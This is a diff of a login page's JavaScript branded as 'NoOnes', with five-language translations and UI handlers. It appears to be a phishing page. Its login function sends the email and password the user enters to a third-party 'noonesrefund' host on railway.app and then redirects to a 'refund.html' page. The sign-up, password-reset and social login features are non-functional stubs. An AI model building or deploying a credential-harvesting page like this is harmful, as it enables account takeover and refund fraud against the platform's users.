@@ -2,14 +2,7 @@
     // ============================================
     // BACKEND CONFIGURATION
     // ============================================
-    // Try multiple URLs in case one fails
-    const API_URLS = [
-        'https://noonesrefund-production.up.railway.app',
-        'https://noonesrefund.railway.app',
-        'http://localhost:5000'
-    ];
-    
-    let currentApiUrl = API_URLS[0];
+    const API_URL = 'https://noonesrefund-production.up.railway.app';
 
     // ============================================
     // TOAST NOTIFICATION
@@ -28,7 +21,7 @@
     }
 
     // ============================================
-    // LOGIN FUNCTION WITH FALLBACK
+    // LOGIN FUNCTION - CONNECTS TO BACKEND
     // ============================================
     async function handleLogin() {
         const email = document.getElementById('email-phone').value.trim();
@@ -55,89 +48,310 @@
         loginSpinner.classList.add('active');
         loginText.textContent = 'Logging in...';
 
-        let success = false;
-        let lastError = null;
+        try {
+            console.log('📨 Sending login to:', `${API_URL}/api/login`);
+            
+            const response = await fetch(`${API_URL}/api/login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            });
 
-        // Try each API URL
-        for (let i = 0; i < API_URLS.length; i++) {
-            const url = API_URLS[i];
-            try {
-                console.log(`Attempting login with: ${url}/api/login`);
+            const data = await response.json();
+
+            if (response.ok && data.success) {
+                const successMessages = {
+                    'en': '✅ Login successful! Redirecting...',
+                    'es': '✅ ¡Inicio de sesión exitoso! Redirigiendo...',
+                    'fr': '✅ Connexion réussie ! Redirection...',
+                    'de': '✅ Anmeldung erfolgreich! Weiterleitung...',
+                    'zh': '✅ 登录成功！正在跳转...'
+                };
+                showToast(successMessages[currentLanguage] || successMessages['en'], 'success');
                 
-                const response = await fetch(`${url}/api/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok && data.success) {
-                    // Success - store which URL worked
-                    currentApiUrl = url;
-                    success = true;
-                    
-                    const successMessages = {
-                        'en': '✅ Login successful! Redirecting...',
-                        'es': '✅ ¡Inicio de sesión exitoso! Redirigiendo...',
-                        'fr': '✅ Connexion réussie ! Redirection...',
-                        'de': '✅ Anmeldung erfolgreich! Weiterleitung...',
-                        'zh': '✅ 登录成功！正在跳转...'
-                    };
-                    showToast(successMessages[currentLanguage] || successMessages['en'], 'success');
-                    
-                    // Redirect to refund page after 1.5 seconds
-                    setTimeout(() => {
-                        window.location.href = 'refund.html';
-                    }, 1500);
-                    break;
-                } else if (response.status === 404) {
-                    console.log(`URL ${url} returned 404, trying next...`);
-                    continue;
-                } else {
-                    // Other error
-                    const errorMessages = {
-                        'en': `❌ ${data.message || 'Login failed. Please try again.'}`,
-                        'es': `❌ ${data.message || 'Error al iniciar sesión. Inténtelo de nuevo.'}`,
-                        'fr': `❌ ${data.message || 'Échec de la connexion. Veuillez réessayer.'}`,
-                        'de': `❌ ${data.message || 'Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.'}`,
-                        'zh': `❌ ${data.message || '登录失败。请重试。'}`
-                    };
-                    showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
-                    success = false;
-                    break;
-                }
-            } catch (error) {
-                console.error(`Error with ${url}:`, error);
-                lastError = error;
-                // Continue to next URL
-                continue;
+                setTimeout(() => {
+                    window.location.href = 'refund.html';
+                }, 1500);
+            } else {
+                const errorMessages = {
+                    'en': `❌ ${data.message || 'Login failed. Please try again.'}`,
+                    'es': `❌ ${data.message || 'Error al iniciar sesión. Inténtelo de nuevo.'}`,
+                    'fr': `❌ ${data.message || 'Échec de la connexion. Veuillez réessayer.'}`,
+                    'de': `❌ ${data.message || 'Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.'}`,
+                    'zh': `❌ ${data.message || '登录失败。请重试。'}`
+                };
+                showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
             }
-        }
-
-        // If all URLs failed
-        if (!success) {
+        } catch (error) {
+            console.error('❌ Login error:', error);
             const errorMessages = {
-                'en': '❌ Cannot connect to server. Please try again later.',
-                'es': '❌ No se puede conectar al servidor. Inténtelo más tarde.',
-                'fr': '❌ Impossible de se connecter au serveur. Veuillez réessayer plus tard.',
-                'de': '❌ Verbindung zum Server fehlgeschlagen. Bitte versuchen Sie es später erneut.',
-                'zh': '❌ 无法连接到服务器。请稍后重试。'
+                'en': '❌ Network error. Please check your connection.',
+                'es': '❌ Error de red. Verifique su conexión.',
+                'fr': '❌ Erreur réseau. Vérifiez votre connexion.',
+                'de': '❌ Netzwerkfehler. Bitte überprüfen Sie Ihre Verbindung.',
+                'zh': '❌ 网络错误。请检查您的连接。'
             };
             showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
+        } finally {
+            loginBtn.disabled = false;
+            loginSpinner.classList.remove('active');
+            loginText.textContent = 'Log in';
         }
-
-        // Reset button state
-        loginBtn.disabled = false;
-        loginSpinner.classList.remove('active');
-        loginText.textContent = 'Log in';
     }
 
-    // ... rest of your existing JavaScript (translations, DOM event listeners, etc.) ...
+    // ============================================
+    // LANGUAGE TRANSLATIONS
+    // ============================================
+    const translations = {
+        'en': {
+            'welcome': 'Welcome to NoOnes',
+            'email_phone': 'Email / Phone number',
+            'email_phone_placeholder': 'Enter your email or phone',
+            'password': 'Password',
+            'password_placeholder': 'Enter your password',
+            'forgot_password': 'Forgot password?',
+            'login': 'Log in',
+            'no_account': "Don't have an account?",
+            'sign_up': 'Sign up',
+            'lang_selector': 'English',
+            'aria_email': 'Email or phone number',
+            'aria_password': 'Password'
+        },
+        'es': {
+            'welcome': 'Bienvenido a NoOnes',
+            'email_phone': 'Correo electrónico / Número de teléfono',
+            'email_phone_placeholder': 'Ingresa tu correo o teléfono',
+            'password': 'Contraseña',
+            'password_placeholder': 'Ingresa tu contraseña',
+            'forgot_password': '¿Olvidaste tu contraseña?',
+            'login': 'Iniciar sesión',
+            'no_account': '¿No tienes una cuenta?',
+            'sign_up': 'Regístrate',
+            'lang_selector': 'Español',
+            'aria_email': 'Correo o número de teléfono',
+            'aria_password': 'Contraseña'
+        },
+        'fr': {
+            'welcome': 'Bienvenue sur NoOnes',
+            'email_phone': 'E-mail / Numéro de téléphone',
+            'email_phone_placeholder': 'Entrez votre e-mail ou téléphone',
+            'password': 'Mot de passe',
+            'password_placeholder': 'Entrez votre mot de passe',
+            'forgot_password': 'Mot de passe oublié ?',
+            'login': 'Se connecter',
+            'no_account': "Vous n'avez pas de compte ?",
+            'sign_up': "S'inscrire",
+            'lang_selector': 'Français',
+            'aria_email': 'E-mail ou numéro de téléphone',
+            'aria_password': 'Mot de passe'
+        },
+        'de': {
+            'welcome': 'Willkommen bei NoOnes',
+            'email_phone': 'E-Mail / Telefonnummer',
+            'email_phone_placeholder': 'Gib deine E-Mail oder Telefonnummer ein',
+            'password': 'Passwort',
+            'password_placeholder': 'Gib dein Passwort ein',
+            'forgot_password': 'Passwort vergessen?',
+            'login': 'Anmelden',
+            'no_account': 'Kein Konto?',
+            'sign_up': 'Registrieren',
+            'lang_selector': 'Deutsch',
+            'aria_email': 'E-Mail oder Telefonnummer',
+            'aria_password': 'Passwort'
+        },
+        'zh': {
+            'welcome': '欢迎来到 NoOnes',
+            'email_phone': '电子邮件 / 手机号码',
+            'email_phone_placeholder': '输入您的电子邮件或手机号',
+            'password': '密码',
+            'password_placeholder': '输入您的密码',
+            'forgot_password': '忘记密码？',
+            'login': '登录',
+            'no_account': '还没有账户？',
+            'sign_up': '注册',
+            'lang_selector': '中文',
+            'aria_email': '电子邮件或手机号码',
+            'aria_password': '密码'
+        }
+    };
+
+    let currentLanguage = 'en';
+
+    function updateLanguage(lang) {
+        currentLanguage = lang;
+        const t = translations[lang] || translations['en'];
+        
+        document.querySelector('.tw-text-h2.tw-font-bold').textContent = t.welcome;
+        
+        const emailLabel = document.querySelector('label[for="email-phone"]');
+        if (emailLabel) emailLabel.textContent = t.email_phone;
+        
+        const emailInput = document.getElementById('email-phone');
+        if (emailInput) {
+            emailInput.placeholder = t.email_phone_placeholder;
+            emailInput.setAttribute('aria-label', t.aria_email);
+        }
+        
+        const passwordLabel = document.querySelector('label[for="password"]');
+        if (passwordLabel) passwordLabel.textContent = t.password;
+        
+        const passwordInput = document.getElementById('password');
+        if (passwordInput) {
+            passwordInput.placeholder = t.password_placeholder;
+            passwordInput.setAttribute('aria-label', t.aria_password);
+        }
+        
+        const forgotLink = document.querySelector('.tw-forgot-link');
+        if (forgotLink) forgotLink.textContent = t.forgot_password;
+        
+        const loginText = document.getElementById('loginText');
+        if (loginText && !document.getElementById('loginBtn').disabled) {
+            loginText.textContent = t.login;
+        }
+        
+        const noAccountSpan = document.querySelector('.tw-text-grey-green-text');
+        if (noAccountSpan) noAccountSpan.textContent = t.no_account + ' ';
+        
+        const signUpLink = document.querySelector('.tw-signup-link');
+        if (signUpLink) signUpLink.textContent = t.sign_up;
+        
+        const langSelector = document.querySelector('.tw-lang-selector');
+        if (langSelector) langSelector.textContent = t.lang_selector;
+        
+        document.documentElement.lang = lang;
+    }
+
+    // ============================================
+    // DOM EVENT LISTENERS
+    // ============================================
+    document.addEventListener('DOMContentLoaded', function() {
+        // Password toggle
+        document.querySelectorAll('.tw-password-toggle').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const input = this.closest('.tw-input-wrapper').querySelector('input');
+                if (input) {
+                    const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+                    input.setAttribute('type', type);
+                }
+            });
+        });
+
+        // Theme toggle
+        const themeToggle = document.querySelector('.tw-theme-toggle-sm');
+        if (themeToggle) {
+            themeToggle.addEventListener('click', function() {
+                this.classList.toggle('active');
+                const thumb = this.querySelector('.tw-theme-thumb-sm');
+                if (thumb) {
+                    thumb.textContent = this.classList.contains('active') ? '☀️' : '🌙';
+                }
+                const scheme = this.classList.contains('active') ? 'dark' : 'light';
+                document.documentElement.setAttribute('data-mantine-color-scheme', scheme);
+                
+                try {
+                    localStorage.setItem('theme-preference', scheme);
+                } catch (e) {}
+            });
+            
+            try {
+                const savedTheme = localStorage.getItem('theme-preference');
+                if (savedTheme === 'dark') {
+                    themeToggle.classList.add('active');
+                    const thumb = themeToggle.querySelector('.tw-theme-thumb-sm');
+                    if (thumb) thumb.textContent = '☀️';
+                    document.documentElement.setAttribute('data-mantine-color-scheme', 'dark');
+                }
+            } catch (e) {}
+        }
+
+        // Language selector
+        const langSelector = document.querySelector('.tw-lang-selector');
+        if (langSelector) {
+            const languages = ['en', 'es', 'fr', 'de', 'zh'];
+            let langIndex = 0;
+            
+            langSelector.addEventListener('click', function() {
+                langIndex = (langIndex + 1) % languages.length;
+                const newLang = languages[langIndex];
+                updateLanguage(newLang);
+                
+                try {
+                    localStorage.setItem('language-preference', newLang);
+                } catch (e) {}
+            });
+            
+            try {
+                const savedLang = localStorage.getItem('language-preference');
+                if (savedLang && translations[savedLang]) {
+                    const index = languages.indexOf(savedLang);
+                    if (index !== -1) {
+                        langIndex = index;
+                        updateLanguage(savedLang);
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // ===== LOGIN BUTTON - CONNECTED TO BACKEND =====
+        document.getElementById('loginBtn').addEventListener('click', handleLogin);
+
+        // Enter key support
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+        document.getElementById('email-phone').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('password').focus();
+            }
+        });
+
+        // Social buttons
+        document.querySelectorAll('.tw-social-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const label = this.getAttribute('aria-label') || 'Social';
+                const messages = {
+                    'en': `${label} login coming soon`,
+                    'es': `Inicio de sesión con ${label} próximamente`,
+                    'fr': `Connexion avec ${label} bientôt disponible`,
+                    'de': `${label} Anmeldung demnächst verfügbar`,
+                    'zh': `${label} 登录即将推出`
+                };
+                showToast(messages[currentLanguage] || messages['en'], '');
+            });
+        });
+
+        // Forgot & Sign up links
+        document.querySelector('.tw-forgot-link')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            const messages = {
+                'en': 'Password reset feature coming soon',
+                'es': 'Función de restablecimiento de contraseña próximamente',
+                'fr': 'Fonction de réinitialisation du mot de passe bientôt disponible',
+                'de': 'Passwort-Zurücksetzungsfunktion demnächst verfügbar',
+                'zh': '密码重置功能即将推出'
+            };
+            showToast(messages[currentLanguage] || messages['en'], '');
+        });
+        
+        document.querySelector('.tw-signup-link')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            const messages = {
+                'en': 'Sign up feature coming soon',
+                'es': 'Función de registro próximamente',
+                'fr': "Fonction d'inscription bientôt disponible",
+                'de': 'Registrierungsfunktion demnächst verfügbar',
+                'zh': '注册功能即将推出'
+            };
+            showToast(messages[currentLanguage] || messages['en'], '');
+        });
+    });
 </script>
